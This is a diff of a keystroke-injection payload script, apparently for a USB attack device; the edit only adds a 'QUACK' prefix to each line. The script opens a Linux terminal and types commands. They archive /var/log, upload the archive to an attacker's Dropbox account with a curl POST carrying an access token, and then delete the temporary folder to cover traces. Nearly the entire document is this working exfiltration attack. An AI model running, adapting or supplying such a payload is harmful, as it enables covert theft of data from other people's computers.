@@ -14,62 +14,62 @@
 *     - - DROPBOX_ACCESS_TOKEN
 
 
-DELAY 1000
-CTRL-ALT t
+QUACK DELAY 1000
+QUACK CTRL-ALT t
 
 * Required: Set here your Dropbox access TOKEN
-DELAY 2000
-STRING ACCESS_TOKEN="TOKEN"
-ENTER
+QUACK DELAY 2000
+QUACK STRING ACCESS_TOKEN="TOKEN"
+QUACK ENTER
 
 
-DELAY 500
-STRING USER_NAME=$(whoami)
-ENTER
+QUACK DELAY 500
+QUACK STRING USER_NAME=$(whoami)
+QUACK ENTER
 
 * Create random num
-DELAY 500
-STRING RANDOM=$(shuf -i 1-999999999999 -n 1)
-ENTER
+QUACK DELAY 500
+QUACK STRING RANDOM=$(shuf -i 1-999999999999 -n 1)
+QUACK ENTER
 
 * Folder path
-DELAY 500
-STRING TMP_FOLDER_PATH=$(mktemp -d -p "/home/$USER_NAME/tmp/" prefix-XXXXXXXXXX)
-ENTER
+QUACK DELAY 500
+QUACK STRING TMP_FOLDER_PATH=$(mktemp -d -p "/home/$USER_NAME/tmp/" prefix-XXXXXXXXXX)
+QUACK ENTER
 
 * Zip path
-DELAY 500
-STRING ZIP_NAME="$RANDOM.zip"
-ENTER
-DELAY 500
-STRING ZIP_PATH="$TMP_FOLDER_PATH/$ZIP_NAME"
-ENTER
+QUACK DELAY 500
+QUACK STRING ZIP_NAME="$RANDOM.zip"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING ZIP_PATH="$TMP_FOLDER_PATH/$ZIP_NAME"
+QUACK ENTER
 
 * Default log path
-DELAY 500
-STRING LOG_PATH="/var/log/"
-ENTER
+QUACK DELAY 500
+QUACK STRING LOG_PATH="/var/log/"
+QUACK ENTER
 
-DELAY 500
-STRING zip -r "$ZIP_PATH" "$LOG_PATH"
-ENTER
+QUACK DELAY 500
+QUACK STRING zip -r "$ZIP_PATH" "$LOG_PATH"
+QUACK ENTER
 
 * Delay of zipping operation - it depends
-DELAY 10000
+QUACK DELAY 10000
 
-DELAY 500
-STRING DROPBOX_FOLDER="/$ZIP_NAME"
-ENTER
+QUACK DELAY 500
+QUACK STRING DROPBOX_FOLDER="/$ZIP_NAME"
+QUACK ENTER
 
 * Send to Dropbox function
 * DEFINE DROPBOX_API_LINK https://content.dropboxapi.com/2/files/upload
-DELAY 500
-STRING curl -X POST DROPBOX_API_LINK --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
-ENTER
+QUACK DELAY 500
+QUACK STRING curl -X POST DROPBOX_API_LINK --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
+QUACK ENTER
 
 * Send timing - it depends
-DELAY 5000
+QUACK DELAY 5000
 
-DELAY 500
-STRING rm -rf "$TMP_FOLDER_PATH"
-ENTER
+QUACK DELAY 500
+QUACK STRING rm -rf "$TMP_FOLDER_PATH"
+QUACK ENTER
